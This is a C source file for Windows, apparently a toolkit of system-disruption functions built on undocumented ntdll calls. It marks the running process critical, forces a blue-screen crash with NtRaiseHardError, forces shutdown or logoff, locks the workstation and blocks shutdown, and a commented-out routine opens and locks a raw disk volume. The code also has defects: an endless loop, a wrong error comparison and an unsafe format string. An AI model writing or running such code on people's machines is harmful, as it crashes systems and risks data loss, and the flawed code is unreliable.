#ifdef __GNUC__
#ifndef _WIN32
    #error "Windows operating system only"
#endif
    #include <stdio.h>
    #include <time.h>
    #include <windows.h>
    #include <Tlhelp32.h>
    #include <Process.h>
#endif

#ifdef _MSC_VER
#ifndef ALLOW_MSVC
    #error "Unknown compiler, change #error if you want to make it for different compiler instead TDM-GCC"
#endif
#endif

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
    ULONG,
    BOOLEAN,
    BOOLEAN,
    PBOOLEAN
);

EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(
    HANDLE ProcessHandle,
    ULONG ProcessInfoULong,
    PVOID ProcessInformation,
    ULONG ProcessInfoULength
);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStrPMask,
    PLONG_PTR LongParam,
    ULONG ResponseOption,
    PULONG Response
);

#define WI_HYBRID_SHUTDOWN    0x00400000
#define WI_LOGOFF             0
#define WI_POWEROFF           0x00000008
#define WI_REBOOT             0x00000002
#define WI_SHUTDOWN           0x00000001

/** Private **/
VOID
out_err(CHAR *str, ...)
{
    fprintf(stderr, str);
}

VOID
CurrentProcessMakeCritical(VOID)
{
    BOOLEAN boolean;
    ULONG ulong_ptr;
    RtlAdjustPrivilege(20, TRUE, FALSE, &boolean);

    do {
        ulong_ptr = 1;
        if (NtSetInformationProcess((HANDLE) - 1, 0x1d, &ulong_ptr, sizeof(ULONG)) != ERROR_SUCCESS)
        {
            out_err("Something went wrong when marking process as critical. Is current handle exist?");
            exit(1);
        }
    } while (TRUE);
}

VOID
InitBSOD(VOID)
{
    BOOLEAN boolean;
    ULONG ulong_ptr;
    RtlAdjustPrivilege(19, TRUE, FALSE, &boolean);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &ulong_ptr);
}

VOID
PerformTurnOffMode(INT mode)
{
    HANDLE HToken; 
    TOKEN_PRIVILEGES TokenP;
    BOOL is_ok = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &HToken);
    if (is_ok == 0)
    {
        out_err("Failed to get current process token. Error code: %d", GetLastError());
        exit(1);
    }
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &TokenP.Privileges[0].Luid);
    TokenP.PrivilegeCount = 1;
    TokenP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(HToken, FALSE, &TokenP, 0, NULL, NULL);
    ExitWindowsEx(mode, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_BLUESCREEN);
}

VOID
LockComputer(VOID)
{
    BOOL is_ok = LockWorkStation();
    if (is_ok == 0)
    {
        out_err("Failed to lock workstation. Error code: %d", GetLastError());
        exit(1);
    }
}

VOID
BlockSysShutdown(HWND hWnd, LPCWSTR pwszReason, INT nTimeMs)
{
    BOOL is_ok = ShutdownBlockReasonCreate(hWnd, pwszReason);
    BOOL is_ok_des;
    if (is_ok == ERROR_ACCESS_DENIED)
    {
        out_err("Access violation. Error code: %d", GetLastError());
        exit(1);
    }
    INT c_clock = clock();
    while ((clock() - c_clock) < nTimeMs)
    {
        is_ok_des = ShutdownBlockReasonDestroy(hWnd);
        if (is_ok_des == 0)
        {
            out_err("Failed to unblock shutdown. Error code: %d", GetLastError());
            exit(1);
        }
    }
}

/**
VOID
dev_io()
{
    DWORD b;
    PUCHAR buffer = (PUCHAR)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        512 * sizeof(PUCHAR)
    );
    HANDLE h = CreateFile("\\\\?\\D:",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        0,
        NULL);

    if (ReadFile(h, buffer, 512, &b, NULL)) {
        for (int i = 0; i < 10; i++) {
            printf("\n[0x%08x] ", i);
            printf("%02x ", buffer[i]);
        }
    }
    if (DeviceIoControl(h, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &b, NULL))
    {
        out_err("done");
    } else {
        out_err("nop");
    }
}
**/
